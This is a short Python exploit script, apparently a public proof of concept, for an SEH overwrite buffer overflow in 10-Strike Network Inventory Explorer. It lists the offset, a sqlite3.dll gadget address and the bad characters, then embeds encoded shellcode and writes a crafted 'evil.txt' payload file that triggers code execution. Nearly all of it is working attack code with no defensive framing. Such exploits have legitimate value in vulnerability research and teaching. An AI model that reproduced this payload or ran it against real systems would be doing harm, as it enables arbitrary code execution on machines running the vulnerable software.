#Created by: Uday Mittal (Yaksas CSC)

#This code exploits the SEH overwrite vulnerability in 10-Strike Network Inventory Manager.

# EIP Offset: 180

#   0x61e759c6 : xchg eax,esp # call eax |  {PAGE_EXECUTE_READ} [sqlite3.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.12.2 (C:\Program Files\10-Strike Network Inventory Explorer\sqlite3.dll)
# badchars: \x00\x0A\x0D\x3A\x5C

import sys

buf =  ""
buf += "\xbd\x32\x2e\x96\x04\xda\xdb\xd9\x74\x24\xf4\x5f\x2b"
buf += "\xc9\xb1\x56\x31\x6f\x13\x03\x6f\x13\x83\xc7\x36\xcc"
buf += "\x63\xf8\xde\x92\x8c\x01\x1e\xf3\x05\xe4\x2f\x33\x71"
buf += "\x6c\x1f\x83\xf1\x20\x93\x68\x57\xd1\x20\x1c\x70\xd6"
buf += "\x81\xab\xa6\xd9\x12\x87\x9b\x78\x90\xda\xcf\x5a\xa9"
buf += "\x14\x02\x9a\xee\x49\xef\xce\xa7\x06\x42\xff\xcc\x53"
buf += "\x5f\x74\x9e\x72\xe7\x69\x56\x74\xc6\x3f\xed\x2f\xc8"
buf += "\xbe\x22\x44\x41\xd9\x27\x61\x1b\x52\x93\x1d\x9a\xb2"
buf += "\xea\xde\x31\xfb\xc3\x2c\x4b\x3b\xe3\xce\x3e\x35\x10"
buf += "\x72\x39\x82\x6b\xa8\xcc\x11\xcb\x3b\x76\xfe\xea\xe8"
buf += "\xe1\x75\xe0\x45\x65\xd1\xe4\x58\xaa\x69\x10\xd0\x4d"
buf += "\xbe\x91\xa2\x69\x1a\xfa\x71\x13\x3b\xa6\xd4\x2c\x5b"
buf += "\x09\x88\x88\x17\xa7\xdd\xa0\x75\xaf\x12\x89\x85\x2f"
buf += "\x3d\x9a\xf6\x1d\xe2\x30\x91\x2d\x6b\x9f\x66\x24\x7b"
buf += "\x20\xb8\x8e\xec\xde\x39\xee\x25\x25\x6d\xbe\x5d\x8c"
buf += "\x0e\x55\x9e\x31\xdb\xc3\x94\xa5\x24\xbb\x82\x29\xcd"
buf += "\xb9\xd4\x40\x51\x34\x32\x32\x39\x16\xeb\xf3\xe9\xd6"
buf += "\x5b\x9c\xe3\xd9\x84\xbc\x0b\x30\xad\x57\xe4\xec\x85"
buf += "\xcf\x9d\xb5\x5e\x71\x61\x60\x1b\xb1\xe9\x80\xdb\x7c"
buf += "\x1a\xe1\xcf\x69\x7d\x09\x10\x6a\xe8\x09\x7a\x6e\xba"
buf += "\x5e\x12\x6c\x9b\xa8\xbd\x8f\xce\xab\xba\x70\x8f\x9d"
buf += "\xb1\x47\x05\xa1\xad\xa7\xc9\x21\x2e\xfe\x83\x21\x46"
buf += "\xa6\xf7\x72\x73\xa9\x2d\xe7\x28\x3c\xce\x51\x9c\x97"
buf += "\xa6\x5f\xfb\xd0\x68\xa0\x2e\x63\x6e\x5e\xac\x4c\xd7"
buf += "\x36\x4e\xcd\xe7\xc6\x24\xcd\xb7\xae\xb3\xe2\x38\x1e"
buf += "\x3b\x29\x11\x36\xb6\xbc\xd3\xa7\xc7\x94\xb2\x79\xc7"
buf += "\x1b\x6f\x8a\xb2\x54\x90\x6b\x43\x7d\xf5\x6c\x43\x81"
buf += "\x0b\x51\x95\xb8\x79\x94\x25\xff\x72\xa3\x08\x56\x19"
buf += "\xcb\x1f\xa8\x08"


evilString = "A" * 176 + "BBBB" + "\xC6\x59\xe7\x61" + "\x90" * 100 + buf +  "\x90" * 5200



filename = "evil.txt"

textfile = open(filename,'w')
textfile.write(evilString)
textfile.close()
